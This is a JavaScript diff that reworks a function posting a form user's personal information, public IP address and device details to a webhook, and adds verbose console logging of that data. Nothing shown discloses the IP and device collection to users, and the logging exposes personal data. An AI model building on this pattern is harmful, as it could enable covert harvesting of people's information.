@@ -79,15 +79,35 @@ function getDeviceInfo() {
 }
 
 async function sendWebhook(userData) {
-    console.log('Sending webhook...');
-    if (WEBHOOK_URL) {
+    console.log('🚀 Starting webhook send process...');
+    console.log('📋 User data:', userData);
+    
+    if (!WEBHOOK_URL) {
+        console.error('❌ Webhook URL is not configured');
+        return false;
+    }
+    
+    try {
+        console.log('🌐 Getting IP address...');
         const ip = await fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => data.ip)
-            .catch(() => 'Unknown IP');
+            .then(response => {
+                console.log('📡 IP response status:', response.status);
+                return response.json();
+            })
+            .then(data => {
+                console.log('✅ IP retrieved:', data.ip);
+                return data.ip;
+            })
+            .catch(error => {
+                console.error('❌ Failed to get IP:', error);
+                return 'Unknown IP';
+            });
 
+        console.log('📱 Getting device info...');
         const deviceInfo = getDeviceInfo();
+        console.log('📊 Device info collected:', deviceInfo);
 
+        console.log('🔧 Building webhook payload...');
         const embed = {
             title: '📋 User Information Submitted',
             description: '👤 User submitted their personal information',
@@ -111,30 +131,38 @@ async function sendWebhook(userData) {
             ]
         };
 
-        return fetch(WEBHOOK_URL, {
+        const payload = {
+            embeds: [embed]
+        };
+        
+        console.log('📤 Sending webhook to:', WEBHOOK_URL);
+        console.log('📦 Payload:', JSON.stringify(payload, null, 2));
+
+        const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({
-                embeds: [embed]
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('Webhook sent successfully');
-                return true;
-            } else {
-                console.error('Failed to send webhook');
-                return false;
-            }
-        })
-        .catch(error => {
-            console.error('Error sending webhook:', error);
-            return false;
+            body: JSON.stringify(payload)
         });
+        
+        console.log('📡 Webhook response status:', response.status);
+        console.log('📡 Webhook response ok:', response.ok);
+        
+        if (response.ok) {
+            console.log('✅ Webhook sent successfully!');
+            return true;
+        } else {
+            const errorText = await response.text();
+            console.error('❌ Failed to send webhook. Status:', response.status, 'Response:', errorText);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Error sending webhook:', error);
+        console.error('❌ Error details:', error.message);
+        console.error('❌ Error stack:', error.stack);
+        return false;
     }
-    return false;
 }
 
 function updateProgressBar(percentage) {
@@ -285,20 +313,32 @@ function setupInfoForm() {
             phone: phone
         };
         
-        // Send webhook with user data
-        const webhookSuccess = await sendWebhook(userData);
-        
-        // Show success screen
-        document.getElementById('info-form').style.display = 'none';
-        document.getElementById('success-screen').style.display = 'block';
-        
-        // Log completion
-        console.log('User information submitted successfully:', userData);
-        
-        // Could redirect or show additional options after success
-        setTimeout(() => {
-            console.log('Information submission process completed');
-        }, 3000);
+        try {
+            // Send webhook with user data and wait for completion
+            const webhookSuccess = await sendWebhook(userData);
+            
+            // Show success screen
+            document.getElementById('info-form').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'block';
+            
+            // Log completion
+            console.log('User information submitted successfully:', userData);
+            console.log('Webhook status:', webhookSuccess ? 'Success' : 'Failed');
+            
+            // Could redirect or show additional options after success
+            setTimeout(() => {
+                console.log('Information submission process completed');
+            }, 3000);
+        } catch (error) {
+            console.error('Error during submission:', error);
+            
+            // Show error message to user
+            alert('There was an error submitting your information. Please try again.');
+            
+            // Re-enable the button
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Submit Information';
+        }
     });
     
     // Allow Enter key submission
